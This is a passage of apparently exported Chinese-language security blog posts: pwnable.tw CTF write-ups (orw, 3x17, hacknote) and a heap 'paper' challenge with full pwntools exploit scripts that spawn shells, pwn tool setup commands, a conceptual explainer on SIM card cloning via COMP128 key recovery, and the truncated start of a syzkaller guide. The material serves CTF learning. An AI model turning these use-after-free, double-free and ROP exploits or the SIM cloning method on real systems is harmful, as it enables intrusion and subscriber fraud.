分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](orw1.png)\n\n运行起来试试：\n\n![](/orw2.png)\n\nIDA查看二进制文件orw：\n\n![](orw3.png)\n\n伪代码如下：\n\n![](orw4.png)\n\n【orw_seccomp()是一个设置函数，这里的作用是设置只能使用open，read，write三个系统调用。具体原理参考2.4.2中。】\n\nread从标准输入读取数据放到shellcode地址处，然后转到shellcode处去执行代码。\n\nshellcode地址如下：\n\n![](orw5.png)\n\nview, open subviews, segments查看bss段属性：\n\n![](orw6.png)\n\n【这里显示不可执行，但checksec中RWX属性为has RWX segments且实际shellcode放到bss段中后可执行，这里目前还不知道是为什么？？？】\n\n## 2.3 利用\n\n题目只允许使用open，read，write三个系统调用函数，因此通过这三个函数实现打开/home/orw/flag文件，将其读到bss段或者栈中，然后再将bss或栈中的数据写到标准输出（即屏幕上）打印。\n\n![](orw7.png)\n![](orw8.png)\n\npayload对应的汇编代码：\n\n![](orw9.png)\n\n执行得到flag：\n\n![](orw10.png)\n![](orw11.png)\n\n## 2.4 记录\n\n### 2.4.1 64位ubuntu安装32位库\n\nubuntu 64位版本，安装支持32位程序的二进制库。\n\nsudo dpkg --add-architecture i386\n\nsudo apt-get update\n\nsudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386\n\n### 2.4.2 seccomp和prctl\n\n[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)\n\nhttps://www.jianshu.com/p/62ede45cfb2e\n\nhttps://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\n\n### 2.4.3 pwnlib.shellcraft.i386\n\n这次题目中只用到了两个重要的函数。\n\n第一个是将字符串push到栈中，此时esp指向的就是这段字符串。\n\n`pwnlib.shellcraft.i386.pushstr(string, append_null=True)`\n\n```python\n>>>print shellcraft.i386.pushstr('aaaa').rstrip()\n  /* push 'aaaa\\x00' */\n  push 1\n  dec byte ptr [esp]\n  push 0x61616161\n```\n\n第二个是系统调用，syscall是要调用的函数（eax存放系统调用号），后面紧接着的是各个参数（ebx，ecx，edx等）（参数可以是某个寄存器，如’esp’）。\n\n`pwnlib.shellcraft.i386.linux.syscall(syscall=None, arg0=None, arg1=None, arg2=None, arg3=None, arg4=None, arg5=None)`\n\n```python\n>>> print pwnlib.shellcraft.i386.linux.syscall('SYS_execve', 1, 'esp', 2, 0).rstrip()\n    /* call execve(1, 'esp', 2, 0) */\n    push SYS_execve /* 0xb */\n    pop eax\n    push 1\n    pop ebx\n    mov ecx, esp\n    push 2\n    pop edx\n    xor esi, esi\n    int 0x80\n```\n\n参考别人的writeup，发现简洁写法（因为提前用context设置了目标环境）：\n\n![](orw12.png)\n\n# 3 3x17\n\n## 3.1 题目\n\nhttps://pwnable.tw/challenge/#32\n\n## 3.2 分析\n\n查看文件类型和开启的保护机制：\n\n![](3171.png)\n\n是去了符号表的，且静态链接。因此IDA的F5基本上没用了，只能纯看汇编。先执行看看：\n\n![](3172.png)\n\n属于addr和data，这里猜测会是将data写到addr上。 后续查看汇编代码，确实是这样。\n\nIDA打开二进制文件，只有start函数：\n\n![](3173.png)\n\n不知道以上各地址和寄存器的值代表什么内容，因此自己写了个printf(“hello world!\\n”)的小程序，使用IDA打开，找到start对应的汇编，如下：\n\n![](/3174.png)\n\n因此3x17的start可解析为下图：\n\n![](3175.png)\n\n64位汇编参数传递规则如下：\n\n![](3176.png)\n\n因此\n\n__libc_start_main(mian[sub_401B6D], argc, ubp_av, init [loc_4028D0], fini[sub_402960], rtld_fini)\n\nmain函数代码如下：\n\n![](3177.png)\n\nsub_40EE70具体做了什么，看汇编代码太复杂，因此通过gdb调试看结果，使用gdb在401BED处下断点。\n\n![](3178.png)\n\n断点处信息如下：\n\n![](3179.png)\n\n执行完该函数之后，返回值会存放在RAX中。刚刚输入的是12345，返回值为0x3039，即12345的十六进制，因此该函数就是将输入的十进制数转换为一个十六进制地址。\n\n![](31710.png)\n\ninit是执行main函数之前会执行的，而fini是main执行完后执行的函数。\n\n因此考虑用任意地址写去覆盖fini的执行流程。如下是fini的汇编代码，在4B40F0处分别调用两个函数，且调用顺序是先fini_array[1]后fini_array[0]。那么只要将数组中的地址覆盖为我们想要的地址，就可以控制程序去执行了。\n\n![](31711.png)\n\n![](31712.png)\n\n## 3.3 利用\n\n获得以上信息之后，我们需要考虑，应当让fini_array的两个函数地址分别被覆盖为什么，才能达到利用的目的。利用就是get shell。在程序中使用strings搜索“/bin/sh”无果，因此一步完成get shell是不可能的，需要寻找其他方法。\n\nmain函数中可以实现任意地址写，如果将fini_array[1]的地址指向main，那么似乎就可以继续任意地址写。查看main函数，发现byte_4B9330为1时才能进入任意地址写操作，而我们第二次进入该函数时byte_4B9330已经为2了。怎么办呢？但是看看前面的int8，这是一个8位无符号整形，因此不用加多久，就整数溢出又变成1了。\n\n![](31713.png)\n\n那么怎么让main一直被调用呢？剩下的fini_array[0]就派上用场了。\n\n![](31714.png)\n![](31715.png)\n\n把fini_array[1]和fini_array[0]分别覆盖为main和调用array的fini函数，就可以实现如下循环。\n\n![](31716.png)\n\n这样就可以不限次数的任意地址写了。但是往哪里写，写什么内容呢？因为没有可写可执行段，因此直接把shellcode布置到内存空间中跳转执行是不可能的。那么就只能考虑ROP了，但不知道栈的位置，也没法去布置栈空间实现ROP。不过RIP是我们可以控制的，因此只要存在某一刻rsp会被泄露出来，那么只要在这一刻之前把对应地址空间布置好，那么就可以不断地ret然后把ROP链串起来啦。\n\n回到fini函数中，rbp原本的值被暂时存放在栈中，这里以rbp做临时寄存器，存放了fini_array的起始地址，此时rbp=0x4B40F0。\n\n![](31717.png)\n\n如果call指令能跳转到leave; ret; 这样的指令去，那么就可以控制rsp的地址了。如下是main函数中一条合适的指令：\n\n![](31718.png)\n\n```assembly\nrbp = 0x4B40F0\n\nleave:\nmov rsp,rbp          rsp = 0x4B40F0, rbp = 0x4B40F0\npop rbp                 rsp = 0x4B40F8, rbp = fini_array[0]\n\nret:\npop rip                  rsp = 0x4B4100, rip = fini_array[1]\n```\n\n这里必须让fini_array[1]为main，fini_array[0]为0x401C4B。这样rip被控制再去执行一次main函数，利用最后的ret，使rip从0x4B4100处执行，这里是我们提前布置好的空间。\n\n那么接下来的工作就是怎么布置0x4B4100以上的空间，通过ROP的方式获取shell。\n\n一条简单的获取shell的命令：\n\n![](31719.png)\n\n32位系统上通过int 80进行系统调用，64位系统上通过syscall指令实现。根据以上代码，需要控制rax为59（execve的系统调用号，0x3B），rdi为字符串“/bin/sh\\x00”的地址，rsi为0，rdx为0。因此rsp指向位置的ROP链应如此布置：\n\n```assembly\npop_rax\n0x3B\npop rdi\naddr_of_bin_sh\npop rsi\n0\npop rdx\n0\nsyscall\n```\n\n最后，字符串“/bin/sh\\x00”随便找一块可写的空间写上去就行。\n\n寻找gadget：\n\n![](31720.png)\n\n![](31721.png)\n\n![](31722.png)\n\n![](31723.png)\n\n![](31724.png)\n\n写exp：\n\n![](31725.png)\n\n执行获得flag：\n\n![](31726.png)\n\n## 3.4 记录\n\n### 3.4.1 64位汇编参数传递\n\nhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之hacknote","url":"/2020/03/01/hacknote/","content":"\n# 1 题目\n\n[题目链接](https://pwnable.tw/challenge/#5)\n\n![](hacknote-1.png)\n\n提供了一个二进制文件hacknote和一个库libc.so。\n\n# 2 分析\n\n首先分析一下这个题目的可执行程序。这是一个32bit的可执行程序，动态链接且去了符号表。该二进制程序符号表可读可写，开启了栈不可执行和canary保护，没有开启地址随机化。\n![](hacknote-2.png)\n执行以下试试。如下图，该程序提供了几个功能，添加/删除/打印笔记。我们用IDA看看这些功能的实现。\n![](hacknote-3.png)\n（1）add note功能\n![](hacknote-4.png)\nAdd操作只能执行5次。Sub_804862B函数如下，将a1+4这个地址处的指针取出，然后利用puts将该指针指向的内容进行打印。\n![](hacknote-5.png)\nChunk1和chunk2的关系如下图所示：\n![](hacknote-6.png)\n（2）delete note功能（这里存在漏洞点）\n![](hacknote-7.png)\n可以看到，delete函数将chunk2和chunk1释放掉后，并没有将指向各chunk的指针ptr[v1]置NULL，导致了悬空指针的产生。\n\n（3）print note功能\n![](hacknote-8.png)\n\n# 3 利用\n\n> 利用主要从两个方面去考虑（以第2节中chunk1和chunk2的图为例）：\n> 1、puts的内容就是chunk2中的内容，因此考虑将chunk2中的内容覆盖为我们想要的东西。如libc中某个函数的地址，这样我们就可以计算得到libc的基址，从而知道任意一个libc函数在动态执行时的地址。\n> 2、chunk1的的内容部分，前四个字节是一个函数指针，如果我们能控制这个chunk的前四个字节，就可以实现任意地址执行，劫持EIP。然而chunk1的内容并非我们能轻易改动的，因此需要结合glibc的堆管理机制中存在的漏洞，使chunk1的内容变得可控，且依然满足原来可执行的特性。从这里可以看出，我们需要两个不同的对象操作同一块内容，本质就是UAF。\n\n## 3.1 获取libc基址\n\n### 3.1.1 本地调试时libc的基址\n本地调试时，可以在gdb中方便地获取到libc的基址，为0xf7e07000。\n![](hacknote-9.png)\n### 3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址\n**Unsorted bin有一个特性，就是链表中第一个chunk的fd和bk均指向main_arena结构体中的top位置。因此只要我们泄露出这个地址，加上题目提供的libc，就可以轻松计算出libc在实际场景中的基址了。**\n\n首先add一个64字节的note，再add一个10字节的note，然后delete掉第一个note。此举的目的是使第一个note中大于fastbin的堆块不被top chunk给合并掉，从而该堆块可以进入unsorted bin。\n![](hacknote-10.png)\n再次申请64字节的空间，堆管理器会把unsorted bin中的chunk再次分配给我们，此时index 2和index 0指向同一块堆内存区域。此时输入的内容只要不覆盖到unsorted bin中那个chunk的bk位置，就可以在成功分配后，调用print打该内存区域，获得main_arena中top的地址（地址是不可显示字符，所以显示乱码）。\n![](hacknote-11.png)\n![](/hacknote-12.png)\n![](hacknote-13.png)\n### 3.1.3 远端的libc中top相对libc基址的偏移\n\nLibc库中的Malloc_trim函数中存在main_arena结构体，如下图位置：\n![](hacknote-14.png)\n查看main_arena在libc库中的偏移为0x001B0780。按照main_arena结构体与unsorted bin的关系（如下图），可知第一个被归档到unsorted bin的chunk，其fd与bk应当指向0x001B0780+0x30=0x001B07B0。\n![](hacknote-15.png)\n因此unsorted bin中返回的值，与libc基址的偏移为0x001B07B0。\n\n那么libc_base = addr(dongtai_top) – 0x001B07B0，因此只需要用3.1.2中的方法将top的地址泄露出来，就可以计算出libc的基址啦。\n\n## 3.2 劫持EIP\n>思路：申请note时会建立chunk1（8byte）和chunk2（跟chunk1不同的大小就行），若再申请一个note，此时又会建立chunk1`和chunk2`。将这两个note删除后，chunk1和chunk1`会被链到同一大小（8byte）的fastbin上，chunk2和chunk2`会被链到其他大小的fastbin上。如果此时再申请一个8byte的note，就会将chunk1`和chunk1分别作为puts函数堆和内容堆。这个时候，chunk1被index 0和index2同时锁定。我们通过index 2 更改chunk1中的内容，然后通过index 0 去执行被替换掉的函数指针。\n\n具体操作如下：\n\n先申请两个大小为30的note，然后删除掉这两个note\n![](hacknote-16.png)\n再add一个大小为8的note，此时会将fastbin上大小为8的chunk进行分配。如下图，从上往下，第一个chunk已经被写入555了。\n![](hacknote-17.png)\n此时print 2得到如下结果。print 0 会报段错误，eip被覆盖成了555（即最后申请大小为8的堆时输入的content）。说明我们可以通过这种方式控制eip指针。\n![](hacknote-18.png)\n![](hacknote-19.png)\n\nEXP如下：\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./hacknote')\nmylibc = ELF('./libc_32.so.6')\nio = remote('chall.pwnable.tw',10102)\n\ndef add_note(size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"size :\")\n    io.sendline(str(size))\n    io.recvuntil(\"Content :\")\n    io.sendline(content)\n\ndef del_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\ndef print_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\n\nadd_note(64,\"12\")\nadd_note(32,\"12\")\ndel_note(0)\nadd_note(64,\"45\")\nprint_note(2)\n\nlibc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0\nsys_addr = libc_addr + mylibc.symbols['system']\n\n# add_note(8,\"12\")\n# add_note(8,\"34\")\n# del_note(3)\n# del_note(4)\ndel_note(0)\ndel_note(1)\nadd_note(8,p32(sys_addr)+\";sh\\x00\")\nprint_note(0)\nio.interactive()\n\n```\n\n# 4 记录\n\n## unsorted bin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\n\n\n","tags":["heap","unsortedbin"],"categories":["CTF"]},{"title":"ctf堆入门 - paper","url":"/2020/02/23/paper/","content":"\n[题目文件链接](https://xuanxuanblingbling.github.io/assets/pwn/paper)\n\n# 1、寻找漏洞点\n\n拿到ELF后，先看看它的一些信息。\n- File查看文件格式\n- Checksec查看开启的安全编译选项\n- 运行一下看看都有哪些功能\n- 使用IDA看看伪代码，理解整个二进制程序的功并查找漏洞点。\n\n![](paper-1.png)\n\n64位程序，动态链接，没有去符号表，got表可写可读，开启栈不可执行和canary保护，没有做地址随机化。\n\n![](paper-2.png)\n\n程序提供两个功能，增加paper和删除paper，paper中可以存放指定大小的数据。\n\n![](paper-3.png)\n\nIDA查看程序实现，关注add_paper和delete_paper。\n\n![](paper-4.png)\n\nAdd paper中申请一块堆，然后存放数据。这个函数实现各项检查都做得很好，没发现漏洞点。\n\n![](paper-5.png)\n\nDelete paper中free掉指向堆的`link_list[index]`指针后，没有将该指针置NULL。导致一个悬空指针的产生《对几类危险的指针，见本文的记录——三类漏洞指针》。\n\n# 2、利用分析\n\n堆管理机制中，对于较小的堆块，采用fastbin的方式进行回收（本题中要求堆块小于0x80，这样free操作之后，该chunk会被链接到fastbin上）。本题中，申请的最大堆内存为1024Byte，所以要控制申请的堆大小不超过0x80。\n\n根据fastbin的单向链表及其他特性《见记录——fastbin attack》，我们需要通过double free在fastbin的链表中构造一个环（如下图）。然后申请一个与chunk1、chunk2相同大小的堆，此时会返回chunk1给线程使用，于是可以更改chunk1中的数据（如将“fd”位置处的值改为我们的目标地址）。下一次malloc时分配chunk2，再下一次分配时依然是chunk1，但此时main_arena已经指向目标地址处（如果目标地址合理）了。此时再malloc一次，就可以实现对该地址空间写任意值了。\n\n![](paper-6.png)\n\n这样接下来的目标就是，往哪里写才能getshell呢？\n\n要getshell就必须控制指针的执行流，使其执行我们构造的提权函数或者直接去执行该二进制文件中已有的提权函数。\n\n（1）寻找或构造提权函数（这里以ELF中自带提权函数为例）\n\n回到ELF文件，搜索“/bin/sh”或system函数，看是否存在这种后门，使利用更加简单。在string窗口中搜索“/bin/sh”，查看其引用gg，发现gg中会调用system(“/bin/sh”)。\n\n![](paper-7.png)\n\n![](paper-8.png)\n\n![](paper-9.png)\n\n至此，我们的提权函数就找到了！那么怎样才能让程序流乖乖地来执行我们的提权函数呢？\n\n（2）替换函数内容或替换函数指针（这里以替换函数指针为例）\n\t\n控制执行流的做法通常是将原本要执行的函数进行替换，替换函数指针或者替换掉函数内容。\n\n这里我们已经有了一个提权函数gg，且ELF并未开启地址随机化，那么首先想到的是控制某个函数指针指向gg。也就是说要把gg函数的地址0x00400943写到某个会被当做“函数指针”的地址0x12345678上去，这样当原本程序流从该0x12345678上取值并跳转执行时，就会执行gg函数了。\n\n![](paper-10.png)\n\n往哪里写这个gg函数地址呢？回到ELF文件，逆向查看伪源码，源码中并未定义有用的函数指针，但是栈上的返回地址可以作为考虑的一个选项。另外一种方法，就是去覆写got表了，具体做法是更改该got表的某个表项内地址为gg函数地址。这样当程序执行到该got表中函数（如printf、puts、gets等等）时，便会去执行我们的提权函数啦。\n\n那么最后，怎么获取到got表的地址以及该got条目的地址呢？由于本题的ELF未开启地址随机化，所以可直接通过IDA查看got表的起始地址以及各表项的具体地址。然而，对于开启随机化的ELF，就需要我们想办法去泄露got表地址了，这个方法在这篇文章中不予讨论。\n\n可以看到该ELF的got表条目如下，got表地址为0x00602000。\n\n![](paper-11.png)\n\n到这里利用思路基本明确了，就是将chunk1中fd的地址替换成got表中某一项（会执行到的函数）的值，然后将该项的值改成gg函数地址。\n\n那么这个got表中的地址需不需要满足什么条件呢？答案是必须的！main_arena把chunk从fastbin链表上卸下来的时候，会去检查该chunk中fd指向的另一chunk是否为合法chunk。合法chunk的特征是什么呢？就是目标chunk数据区之前的八个字节（64位下）必须是合法的size值，标志这个chunk的大小。Ps：其实只要这八个字节的低四字节满足就可以了。\n\n因此我们需要在上述got表中，寻找满足这种条件的地址。如下图，标记颜色的五个部分满足低四个字节为0x00000040或0x00000060，这可以是一个合法的size值。\n\n![](paper-12.png)\n\n但是选哪个作为目标地址呢，还需要结合got表项进行考虑。\n\n- 选0x602002处作为chunk的size部分\n- 选0x60201a处作为chunk的size部分\n- 选0x602032处作为chunk的size部分\n- 选0x60203a处作为chunk的size部分\n\n如果我们想覆写printf函数，即0x602040处的值，那么得使用0x602032处作为chunk的size部分。此时整个chunk的起始地址是0x60202a。可任意写的数据区从0x60203a开始。由于system函数在0x602038至0x60203f区间，因此0x60203a至0x60203f的值需要保持不变。需要将0x602040至0x602047的值改为gg函数地址。因此需要往0x60202a写入的内容为：\\x40\\x00\\x00\\x00\\x00\\x00+gg地址\n\n因为最终选择的chunk size（包含chunk头）为0x40，所以申请的堆内存大小必须是0x30。接下来可以写利用代码了。\n\n# 3、EXP\n\n```python\nfrom pwn import *\ncontext(os=\"linux\",arch=\"amd64\",log_level=\"debug\")\n\ne = ELF(\"./paper\")\nio = process(e.path)\n\ndef add_paper(index,length,content):\n    io.recv()\n    io.sendline(\"1\")\n    io.recv()\n    io.sendline(str(index))\n    io.recv()\n    io.sendline(str(length))\n    io.recv()\n    io.sendline(content)\n\ndef delete_paper(index):\n    io.recv()\n    io.sendline(\"2\")\n    io.recv()\n    io.sendline(str(index))\n    \nadd_paper(1,0x30,\"111\")\nadd_paper(2,0x30,\"222\")\n\ndelete_paper(1)\ndelete_paper(2)\ndelete_paper(1)\n\nadd_paper(3,0x30,p64(0x0060202a))\nadd_paper(4,0x30,\"444\")\nadd_paper(5,0x30,\"555\")\nadd_paper(6,0x30,\"\\x40\\x00\\x00\\x00\\x00\\x00\"+p64(e.symbols[\"gg\"]))\n\nio.recv()\nio.sendline(\"t\")\nio.interactive()\n\n```\n\n执行成功，getshell！\n\n![](paper-13.png)\n\n# 4、记录\n\n## 三类漏洞指针\n\n1、空指针：指向NULL的指针，若使用指针前未判断其是否为空，可导致程序崩溃。\n\n2、悬空指针：也称迷途指针，指向一段已释放的内存单元的指针，可导致UAF等漏洞。\n\n3、野指针：指向一段未初始化内存单元的指针。\n\n## fastbin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/\n\n\n## GOT表与PLT\n\nhttps://blog.csdn.net/qq_18661257/article/details/54694748\n\nhttps://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n## pwntools的使用\n\nhttps://www.cnblogs.com/Ox9A82/p/5728149.html\n\n\n\n# 5 新机搭建pwn环境\n\n由于这题必须在ubunut1804环境下利用，所以整个pwn的做题环境又需要重新搭一遍。为了以后再遇到这种情况时，可以迅速完成环境搭建，这里做一下记录。\n\n## 安装pwntools\n\n```shell\napt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n## 安装checksec\n\n```shell\ngit clone https://github.com/slimm609/checksec.sh.git\ncd checksec.sh\nsudo cp checksec /usr/bin/checksec\n```\n\n新版使用方法：\n\n```shell\nchecksec --file=filename\n```\n\n## 安装pwndbg\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\nsudo ./setup.sh\n```\n\n## 安装gef\n\nubuntu中下载gef.py不成功，因此跑去github直接下载源文件：\n\n[gef网址](https://github.com/hugsy/gef)\n\n```shell\n# 下载gef.py至/home/xxx用户根目录\n$ mv gef.py .gdbinit-gef.py\n$ echo \"source ~/.gdbinit-gef.py\" >> ~/.gdbinit\n```\n\n## 安装peda\n\n[peda网址](https://github.com/longld/peda)\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n## 安装ROPGadget\n\n```shell\nsudo pip install capstone\ngit clone https://github.com/JonathanSalwan/ROPgadget.git\ncd ROPgadget\nsudo python3 setup.py install\n```\n\n## 安装one_gadget\n\n```shell\n$ sudo apt -y install ruby\n$ sudo gem install one_gadget \n```\n\n## 安装LibcSearcher\n\n```shell\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\nsudo python3 setup.py develop\n```\n\n## 安装32位libc\n\n方便运行32位程序，有两种方法：\n\n（1）\n\n```shell\nsudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386\nsudo apt-get install libgtk2.0-0:i386\n```\n\n（2）\n\n```shell\n# 第一步，确认系统的架构\ndpkg --print-architecture  \n# 第二步，确认打开了多架构支持功能\npkg --print-foreign-architectures \n# 第三步，安装对应的32位库\nsudo apt-get dist-upgrade #这一步是更新所有的软件，如果你对新版本软件的需求不是那么迫切，可以不执行 \n#安装相关库  \nsudo apt-get install lib32z1 lib32ncurses5 #有的还需要32位stdc++库lib32stdc++6-4.8-dbg\n#安装gcc multilab  \nsudo apt-get install gcc-multilib g++-multilib  \n```\n\n","tags":["heap","fastbin"],"categories":["CTF"]},{"title":"SIM卡复制原理","url":"/2020/02/08/SIM/","content":"# SIM卡复制原理\n\n> GSM手机要想得到GSM系统的服务需要插入一张SIM卡。因为GSM系统是通过SIM卡来识别用户的，而不是基于手机来识别。\n>\n> 移动终端上必须装上sim卡才能使用，sim卡是整个**GSM系统**（全球移动通讯系统）中唯一确认用户身份的设备。\n\n## 常用缩写\n\nSIM，Subscriber Identification Module，客户识别模块（也称用户身份识别卡）。\n\nIMEI，国际移动设备识别码。由15位数字组成，每台手机对应一个IMEI，为全世界独一无二的。\n\nMEID，移动设备识别码。由14位十六进制字符组成。\n\nIMSI，国际移动用户识别码。通过IMSI可反查运营商、归属地、手机号码等信息。\n\n## sim卡的演进\n\n1991年，德国捷德公司开发了世界第一张SIM卡，大小是一个名片的大小。此类卡是**标准SIM卡**，也叫“原卡”。\n\n中国移动通信起步较晚，没赶上“原卡”时代，因此我们一开始接触到的是Mini SIM卡。再之后由于手机逐步小型化，2010年出现了Micro SIM卡，首先使用在苹果公司的产品上，如ipad、iphone4。2011年，苹果公司提出了更小的sim卡标准——Nano SIM卡。\n\n![](sim-4-kinds.png)\n\n以上的演进，说白了就是剪卡过程，并不是什么技术演进。\n\n但是Nano SIM卡还是占据较大的空间，在小型可穿戴设备上不实用，而且卡槽中放卡的方式不稳定。因此发展出了eSIM卡Embeded-SIM，直接嵌入到电路板上。\n\n但是eSIM仍然是一个硬件。现在还出现了依靠操作系统软件实现SIM卡功能的softSIM和vSIM，这样就完全告别实体SIM卡片了。\n\n伴随着网络变化，sim卡的变化：\n\n- SIM卡存在无法接入LTE/IMS网络的局限性\n- USIM可接入LTE/2G/3G网络，但不存储IMS网络相关的用户信息，因此接入VoLTE网络时，还需要通过终端导出IMS注册时所需要的用户码号信息。\n- ISIM卡是在USIM卡的基础上，增加了ISIM模块，专门用于存储IMS网络相关用户码号和归属地信息。可以通过读取ISIM模块中的信息直接接入VoLTE网络。\n\n## sim卡硬件特性\n\n> sim卡是一个装有微处理器的芯片卡。\n\n下面看一看实际的sim卡长什么样：\n\n![](sim-6-parts.png)\n\nsim卡通过这些铜制接口将卡内逻辑电路与移动终端连接起来。其中与移动终端连接的有如下六个触电：电源（Vcc），复位（RESET），时钟（CLK），接地端（GND），编程电压（VPP），数据I/O接口（Data）\n\nsim卡硬件内部包含如下五个模块：\n\n- 微处理器cpu，8位\n- 程序存储器ROM，3~8kbit\n- 工作存储器RAM，6~16kbit\n- 数据存储器EPROM，128~256kbit\n- 串行通信单元\n\n使用时，手机会向sim卡发送命令，sim卡根据标准规范执行后，给手机反馈执行结果。\n\n##　sim卡的功能\n\n1、存储数据：\n\n- 固定数据：这类数据在ME（Mobile Equipment）被出售之前由SIM卡中心写入，包括国际移动用户识别号（IMSI）、鉴权密钥（KI）等\n- 临时数据：指的是网络相关的的临时数据，如位置区域识别码（LAI）、移动用户暂时识别码（TMSI）、禁止接入的公共电话网代码等\n- 业务代码：如个人识别码（PIN）、解锁码（PUK）、计费费率等\n- 电话号码、短消息等用户记录\n\n（以上四类数据，除第一类只有专业部门能查阅和更新外，其他几类都是手机可查阅和更新的）\n\n2、PIN码保护\n\n3、用户身份鉴权\n\n4、SIM卡中的保密算法及密钥\n\n## sim卡认证\n\nSIM卡中没有存储本机号码，仅有IMIS号。当我们在营业厅申请并注册手机号时，运营商将手机号码与SIM卡的IMSI号、序列号以及鉴权密钥Ki做登记，储存在数据库里。\n\nSIM卡插入到手机中开机时，手机向SIM卡请求IMSI，然后把IMSI发送给运营商。运营商在数据库中查找是否存在这个IMSI并判断是否为合法用户，然后获得这个IMSI对应的手机号码和鉴权密钥Ki。\n\n运营商再生成一个随机数RAND，然后将该随机数发送给手机。手机接收到随机数RAND后，将该随机数RAND发送给SIM卡。SIM卡利用RAND和鉴权密钥Ki通过A3算法生成应答SRES，将SRES发送给手机，再由手机转发给运营商。运营商在本地利用RAND和对应的鉴权密钥Ki进行相同的运算，得到X-SRES，并比较SRES和X-SRES是否相同，相同的话就说明这个卡是合法的，允许其接入网络。\n\n上一步骤中，手机端收到RAND时，同时还会让SIM卡利用RAND和Ki计算出一个通信用的加密密钥Kc，计算时用的算法称之为A8。由于A3和A8接受的输入相同，因此实现者偷了个懒，用一个算法同时生成SRES和Kc。\n\n之后的通信过程中，使用加密密钥Kc和A5算法对通信内容进行加密。由于通信内容的加密量巨大，SIM卡无法快速处理如此多的加密需求，因此通信过程中的加密都是在手机上完成的。因此，所有的GSM手机都必须至少支持一种相同的A5算法，否则就无法漫游了。这时候运营商和设备商又偷了个懒，全世界目前都只用一种A5算法。这个算法的做法就是和Kc的8字节序列进行简单的循环XOR，再和报文序号做个减法。\n\n## sim卡复制\n\n从以上SIM卡认证原理中，我们知道IMSI和Ki是必不可少的，A3算法也必须知道。IMSI可以通过手机将其从SIM卡中读取出来，但是A3算法和鉴权密钥Ki是无法直接获取的，只能通过某种方法破解。\n\nA3算法一直被作为高级商业机密保护起来。但在1998年左右，有个人泄露了几页关于A3算法的文档到网络上。加州伯克利的几个教授拿到这个文档后，对照着SIM卡研究了一阵，最终将A3算法破解了。这个算法又叫做Comp128。\n\n怎么获取Ki呢？两个思路，一种是把SIM卡拆掉然后接到特殊设备上将Ki读取出来，另一种是利用Comp128去暴力破解、穷举。前一种方法就像用小刀在硬盘上刻操作系统一样不靠谱。后一种方法有一定的限制，SIM卡中的逻辑是一共只能查询2^16次左右，之后卡就不可用了。因此，研究者们只能在可接受的次数之内，通过构造特定明文和分析输出的密文来破解Ki的值。这种方法最终成功了。\n\n由于SIM复制设备越来越多，运营商们不得不发行新算法的卡，这个算法叫做Comp128 v2。这个算法目前为止还没被破解。\n\n\n# reference\nSIM卡实现原理：https://www.jianshu.com/p/8c9374f5e581\n\n4G LTE 网只能提供数据服务，不能承载语音通话，该怎么理解？https://www.zhihu.com/question/22365275\n\nSIM卡复制原理：https://cn.club.vmall.com/thread-2454925-1-1.html\n\n关于SIM和eSIM，看这一篇就够啦！https://zhuanlan.zhihu.com/p/47999705\n\nSIM卡中的A3、A5和A8算法：http://www.360doc.com/content/11/0913/22/3129476_148024343.shtml\n\n什么是伪基站？https://www.zhihu.com/question/36723973","categories":["通信"]},{"title":"syzkaller","url":"/2019/10/26/syzkaller/","content":"\n# 1.总览\n\n关于[Syzkaller](https://github.com/google/syzkaller)是什么，我就不多说了，介绍的文档很多。直接进入正题吧~\n\ngithub上英文版的指导中，有些许坑需要自己踩踩，所以将搭建syzkaller的环境记录下来，供之后参考。本文计划搭建如下几个环境（会不断更新）：\n\n```\n1. 使用syzkaller去fuzz x86-64架构的linux内核，这个内核是用qemu模拟的。\n2. 使用syzkaller去fuzz arm64的手机设备，qemu模拟和实体机都准备尝试一下。\n3. 两台通过网络连接的linux机器之间的fuzz。\n```\n\n在正式开始之前，先说一下基本环境。我用来搭建环境的主机是Ubuntu18.04虚拟机，gcc版本是7.5.0。\n\n```\nsyzkaller官网对gcc版本的要求是>6.1.0。所以如果你的主机是Ubuntu16.04的话，可以按照安装gcc章节升级一下本地gcc版本。\n```\n\nubuntu 18.04搭建syzkaller环境，需要做以下四件事情：\n\n- 1、准备好C编译环境。\n\n- 2、准备好待测试的Linux kernel，并开启coverage代码覆盖率选项。\n\n\n- 3、准备测试机，虚拟机或者物理机。\n\n- 4、准备好syzkaller源码，并编译。（由于syzkaller是由go语言写的，所以这里需要提前安装好go语言环境）\n\n# 2.安装GCC\n\n> gcc下载地址：[gcc下载](http://ftp.gnu.org/gnu/gcc/)\n\n宿主机自带的gcc版本过低的话，需要在原本的基础上新装一个高版本的gcc。这里我选择源码安装，并且将它安装到一个单独目录，这样今后想卸载的话，直接删除该目录即可。\n\n- 解压gcc-7.4.0源码包：`tar -zxvf 